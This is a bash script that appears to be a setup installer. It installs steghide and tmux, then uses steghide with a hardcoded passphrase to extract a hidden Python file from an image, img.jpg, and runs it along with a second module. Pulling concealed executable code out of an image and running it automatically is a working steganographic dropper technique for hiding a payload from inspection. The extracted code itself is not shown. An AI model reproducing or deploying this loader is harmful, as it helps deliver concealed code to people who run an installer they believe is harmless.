#!/bin/bash
if ! command -v steghide &> /dev/null; then
    if command -v apt-get &> /dev/null; then
        sudo apt-get install -y steghide
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y steghide
    elif command -v yum &> /dev/null; then
        sudo yum install -y steghide
    elif command -v pacman &> /dev/null; then
        sudo pacman -Sy steghide
    fi
fi


if ! command -v tmux &> /dev/null; then
    if command -v apt-get &> /dev/null; then
        sudo apt-get install -y tmux
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y tmux
    elif command -v yum &> /dev/null; then
        sudo yum install -y tmux
    elif command -v pacman &> /dev/null; then
        sudo pacman -Sy tmux
    fi
fi



if ! command -v python3 &> /dev/null; then
    if command -v xmessage &> /dev/null; then
        xmessage -center "Python3 is not installed. Download from official site:\nhttps://www.python.org/downloads/"
    else
        echo "Python3 is not installed. Download from official site:\nhttps://www.python.org/downloads/"
    fi
    exit 1
fi


source lib/bin/activate
steghide extract -sf img.jpg -p "hide" -xf lib/install.py -f
chmod +x lib/install.py
python3 lib/install.py
lib/bin/python3 lib/modules.py


